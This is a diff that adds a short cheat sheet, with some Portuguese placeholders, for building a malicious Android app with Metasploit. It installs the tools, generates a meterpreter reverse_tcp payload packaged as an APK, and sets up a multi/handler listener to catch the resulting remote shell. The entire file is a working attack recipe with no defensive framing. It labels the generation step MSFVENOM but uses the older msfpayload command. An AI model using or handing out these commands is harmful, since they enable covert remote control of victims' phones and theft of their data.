@@ -1,0 +1,14 @@
+apt-get install metasploit-framework*
+apt-get install apktool
+
+# MSFVENOM
+
+msfpayload android/meterpreter/reverse_tcp LHOST=ip LPORT=porta R > /root/name.apk
+
+# MSFCONSOLE
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST ip
+set LPORT porta
+exploit
